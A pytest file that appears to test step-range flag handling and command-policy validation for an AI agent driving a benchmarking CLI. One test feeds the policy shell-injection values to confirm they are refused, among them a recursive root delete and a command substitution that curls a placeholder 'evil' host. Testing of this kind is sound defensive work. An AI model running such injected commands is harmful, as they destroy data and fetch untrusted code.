"""Phase 31 — First-class step selection / re-run (``-s`` / ``flags['step']``).

Hermetic, no cluster / GPU / network. Covers the acceptance criteria:

  * the agent can re-run a single step or step RANGE as a modeled flag (not via ``extra``) —
    ``build_argv`` emits ``-s <spec>`` as pure mechanism, after the subcommand, alongside the
    other flag emissions;
  * the policy PERMITS ``-s``/``--step`` on exactly the four upstream-accepting subcommands
    (standup/smoketest/run/teardown), value-pins the step-list spec, and refuses an injection /
    a subcommand that doesn't accept it;
  * scoping a mutating command with ``-s`` does NOT change its mode (re-running a mutating step
    stays approval-gated);
  * the WHICH-step JUDGMENT lives in knowledge/step_select.md (present + auto-discoverable).
"""
from __future__ import annotations

from pathlib import Path

import pytest

from app.security.policy import MUTATING, READ_ONLY
from app.tools.run.execute import build_argv
from app.tools.schemas import ExecuteInput
from tests._helpers import _argv

# A representative spread of the upstream step-list grammar: a single step, a range, a comma
# list, and a combo of both.
SPECS = ["5", "5-9", "3,7", "3-5,9"]
STEP_SUBCOMMANDS = ["standup", "smoketest", "run", "teardown"]


# ---------------------------------------------------------------------------
# build_argv — step emission (PURE MECHANISM), incl. ranges
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("subcommand", STEP_SUBCOMMANDS)
@pytest.mark.parametrize("spec_val", SPECS)
def test_step_emits_short_s_flag_with_value(subcommand, spec_val):
    argv = build_argv(subcommand, spec="cicd/kind", flags={"step": spec_val})
    assert "-s" in argv
    # -s is a value flag: the exact step-spec (range/list verbatim) immediately follows it.
    assert argv[argv.index("-s") + 1] == spec_val


def test_step_emits_a_range_specifically():
    # The headline acceptance: a step RANGE rides as a modeled flag, byte-for-byte.
    argv = build_argv("standup", spec="cicd/kind", flags={"step": "3-5"})
    assert argv[argv.index("-s") + 1] == "3-5"


@pytest.mark.parametrize("subcommand", STEP_SUBCOMMANDS)
def test_step_unset_or_absent_emits_no_flag(subcommand):
    # No step => the whole phase runs; we never inject -s the agent didn't set.
    for flags in ({"step": None}, {"step": ""}, {}):
        argv = build_argv(subcommand, spec="cicd/kind", flags=flags)
        assert "-s" not in argv


def test_step_is_modeled_not_via_extra():
    # The acceptance bars step from `extra`: setting flags['step'] must produce -s, and it
    # lands AFTER the subcommand alongside the other modeled flags (not the raw passthrough).
    argv = build_argv(
        "run", spec="cicd/kind", harness="inference-perf", workload="sanity_random.yaml",
        flags={"step": "5-9", "output": "local"},
    )
    assert argv[:3] == ["llmdbenchmark", "--spec", "cicd/kind"]
    assert argv.index("-s") > argv.index("run")
    assert argv[argv.index("-s") + 1] == "5-9"
    # other flags are undisturbed
    assert "-l" in argv and "inference-perf" in argv
    assert "-w" in argv and "sanity_random.yaml" in argv
    assert "-r" in argv and "local" in argv
    # nothing was forced into the raw `extra` tail
    assert build_argv("run", spec="cicd/kind", flags={"step": "5-9"}, extra=None)[-2:] == ["-s", "5-9"]


def test_step_lives_in_flags_dict_on_schema():
    # `step` rides in the free-form flags dict (like `monitoring`), NOT a new typed field.
    m = ExecuteInput(subcommand="standup", spec="cicd/kind", flags={"step": "5-9"})
    assert m.flags is not None and m.flags["step"] == "5-9"
    # No top-level step field was added.
    assert not hasattr(m, "step")


# ---------------------------------------------------------------------------
# policy — -s/--step permitted + value-pinned on the four accepting subcommands (DATA)
# ---------------------------------------------------------------------------


# Minimal required extra args so a subcommand validates on its own merits (not step-related).
_REQUIRED_EXTRA = {
    "standup": [],
    "smoketest": [],
    "run": ["-l", "inference-perf", "-w", "sanity_random.yaml"],
    "teardown": [],
}


@pytest.mark.parametrize("subcommand", STEP_SUBCOMMANDS)
@pytest.mark.parametrize("flag", ["-s", "--step"])
@pytest.mark.parametrize("spec_val", SPECS)
def test_policy_permits_step_short_and_long(policy, catalog, subcommand, flag, spec_val):
    d = policy.validate(
        _argv(subcommand, *_REQUIRED_EXTRA[subcommand], flag, spec_val), catalog=catalog
    )
    assert d.allowed, f"{flag} {spec_val} should be allowed on {subcommand}: {d.reason}"


@pytest.mark.parametrize("subcommand", STEP_SUBCOMMANDS)
def test_policy_value_pins_step_list_and_refuses_bad_specs(policy, catalog, subcommand):
    # On the four accepting subcommands -s/--step is a KNOWN, value-pinned flag: valid
    # step-list specs pass; a value that's metachar-clean but NOT a step-list (e.g. 'abc',
    # '5-', '1 2', '1--2') is REFUSED by the step_list regex — that refusal is precisely the
    # guarantee the explicit per-subcommand flagspec buys over the relaxed unknown-flag path.
    extra = _REQUIRED_EXTRA[subcommand]
    for ok in SPECS:
        assert policy.validate(_argv(subcommand, *extra, "-s", ok), catalog=catalog).allowed, ok
    for bad in ["abc", "5-", "-3", "1--2", "5,", "1 2", "5.5"]:
        d = policy.validate(_argv(subcommand, *extra, "-s", bad), catalog=catalog)
        assert not d.allowed, f"step={bad!r} must be refused on {subcommand}: {d}"
    # Shell-injection values are blocked by the blanket metacharacter screen too.
    for inj in ["5; rm -rf /", "$(curl evil)", "5|cat", "5`x`"]:
        assert not policy.validate(_argv(subcommand, *extra, "-s", inj), catalog=catalog).allowed


def test_step_value_pinning_is_what_the_flagspec_adds_over_relaxed_policy(policy, catalog):
    # Documents the value of adding the explicit flagspec (DATA) to ONLY the four accepting
    # subcommands: there, a metachar-clean-but-invalid step value is REJECTED (value-pinned).
    # The policy's relaxed unknown-flag policy means an out-of-place -s elsewhere would just
    # pass through unchecked — so we deliberately pin it only where upstream actually accepts it,
    # and the knowledge file steers the agent to use -s only on standup/smoketest/run/teardown.
    assert not policy.validate(_argv("standup", "-s", "abc"), catalog=catalog).allowed
    # A mutating command scoped with -s never loses its approval gate (mode stays mutating).
    assert policy.validate(_argv("standup", "-s", "5-9"), catalog=catalog).mode == MUTATING


def test_step_does_not_change_mode_classification(policy, catalog):
    # A mutating standup/run/teardown stays MUTATING when scoped with -s — re-running a step
    # is still approval-gated. --dry-run still downgrades to a read-only preview.
    assert policy.validate(_argv("standup", "-s", "5-9"), catalog=catalog).mode == MUTATING
    assert policy.validate(_argv("teardown", "-s", "1-4"), catalog=catalog).mode == MUTATING
    run_argv = _argv("run", *_REQUIRED_EXTRA["run"], "-s", "5-9")
    assert policy.validate(run_argv, catalog=catalog).mode == MUTATING
    dry = policy.validate(_argv("standup", "-s", "5-9", "--dry-run"), catalog=catalog)
    assert dry.allowed and dry.mode == READ_ONLY


# ---------------------------------------------------------------------------
# knowledge — the which-step JUDGMENT is a knowledge file, not Python
# ---------------------------------------------------------------------------

KNOWLEDGE_DIR = Path(__file__).resolve().parents[2] / "knowledge"


def test_step_select_knowledge_exists_and_steers_rerun():
    guide = KNOWLEDGE_DIR / "run/step_select.md"
    assert guide.is_file(), "knowledge/step_select.md must hold the which-step judgment"
    text = guide.read_text()
    # It steers the re-run use case and names the modeled flag (not extra), and tells the
    # agent to read per-phase step numbering at runtime rather than hardcoding it.
    assert "flags['step']" in text
    assert "extra" in text  # explicitly says NOT via extra
    assert "standup" in text and "teardown" in text
    # The four accepting subcommands are documented; the grammar is documented.
    for form in ("N-M", "3-5,9"):
        assert form in text
    # No hardcoded per-phase step TABLE of numbers — judgment points at runtime registries.
    assert "steps/" in text and "READ IT AT RUNTIME" in text


def test_step_select_knowledge_is_autodiscoverable(policy, catalog, tmp_path):
    # The on-demand knowledge index globs knowledge/*.md, so the new guide is reachable via
    # read_knowledge('step_select') with NO Python registration.
    from app.config import get_settings
    from app.security.runner import CommandRunner
    from app.tools.access.knowledge_access import read_knowledge
    from app.tools.context import ToolContext

    s = get_settings()
    ctx = ToolContext(
        settings=s, policy=policy,
        runner=CommandRunner(s.repo_paths), workspace=tmp_path / "ws",
    )
    out = read_knowledge(ctx, name="step_select")
    assert out.get("topic") == "step_select"
    assert "-s" in out["content"] and "step-list" in out["content"]
